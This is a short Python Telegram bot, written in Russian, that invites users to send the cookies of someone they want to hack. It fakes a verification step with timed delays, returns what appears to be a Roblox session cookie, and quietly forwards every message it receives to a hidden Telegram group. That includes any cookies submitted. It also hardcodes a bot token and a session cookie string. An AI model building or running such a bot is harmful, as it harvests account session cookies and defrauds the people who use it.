import os
import telebot
import time

# Временное решение - вставь токен прямо в код
TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"  # ⚠️ ВСТАВЬ СЮДА РЕАЛЬНЫЙ ТОКЕН!
GROUP_ID = "-1003396901780"  # ⚠️ ВСТАВЬ СЮДА РЕАЛЬНЫЙ ID ГРУППЫ!

print(f"🔧 Используется токен: {TOKEN[:10]}...")
print(f"🔧 Используется ID группы: {GROUP_ID}")

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    print(f"👤 Получена команда /start от {message.from_user.id}")
    bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
    
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
        print("✅ Уведомление отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    print(f"📩 Получено сообщение: {message.text}")
    
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(1)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(30)
    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш куки: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzkxOTQ3MDg2MjE2ODkwMjQ1NTkoAw.RVjDz8ZgDCOFyPAE9jKBVCObwWz1RK8mlXMcwnDYUwBWzzgbS-S1yiY6vfGZg862ig-4ZWC0AdKoSoKBRAQj1I1fbh_DSpM2XMBCDcQUMtTd0wsNHOP2zTxE78hYbZxgp_u6N8615q28O7r1tqJ9p6w6-zIfrqxi-Uj1GkOi-MCJMkNuFCxssXt0TBLas1wk_4tet40UJUO5YVSxVYsNA7pryONk_PZQ86ZXIJTyiYBqiHbkNPoiQmxCb9CISwy0aNt4VGJXgI0gPNYUKxtCTSUL-3y8ThXpM0BDC5QcKAvg7Z6tQYVb23WGMHWo88fx5jOpYYAU1wAkTmMObDoVRnCFURCJpCF1GUbhSoWyw-6yyjJqOttWjdzi04OtnhdxNVP_6UpcL6WGye5100RNlnginun9gtKK61nLNu-8Pa1-NwJyNg2DmxIeuoSWaadNYZetVpVnHwqjE7OOKucxjeYrWqKBqSuBrE1hiPk6GQjCnMrtrWwtl7sm0Vxc8ydTiV9dJ1NmL3f2vQwQlefVB3mplBGv-S9F4bH7VHT__vNMHR2ATzML05R8orAWROMoTKxtE9kYAvGFwrFvZVroMw2eHgCKQa4RcDOMpROXy3oll7724vIZhqG_jBG7m-zUDSgf48eaOZ3REwEVWSEJDvJV8imkj7qvt79XNbP7ljO42ptRZVnouYbrMg_NECKqxddPCTwxw7w5T_nHYX-XwXpoiHW-lKc-UaG6Bija2iiOyBqdfZcKs7ThYBimVYPZpEaCoVrxgMgFiLMtWfSGCHmakjkMIZkShv5Eo6FR674mSG_Q_O0m6Sr5ol_BJgMPiThpWsgY7ZUoOxLsee0MH9XmGjAyv_zDXvcIxVlo6DrG8_Qrw9uJSGL7QbygYk10M1B5DQIaSFX0z8uewgP3GvzDT7k-QQDksUJzH3cb-V421h84t-02-RNDAnL0r1YenVA1FhoRzz3LAcX4bfaZtJg1zZmdHSpfeK6kfyqyYxt5Co7JPK3bn0hmo_UFR_TH5qNWrpjSxNunaIWbg0FNnT2WhH4UTjN5eFy47lcUPydzuJgpMzDSLxLRx_reAG0DSs3fwxa1jgSlpCR-VcABCijHaNvmuoVeg1hq4RaD_25A4krBGuMw5ZwJ5snBsl93J-Hfs32SJ5tt-x4_uf3jsnfZxbxclsOLEIEen1uDuJ0aoo9NNqCxPx68Pjq9PIyh14qYbQ...")
    
    try:
        bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
        print("✅ Сообщение переслано в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True, timeout=60)
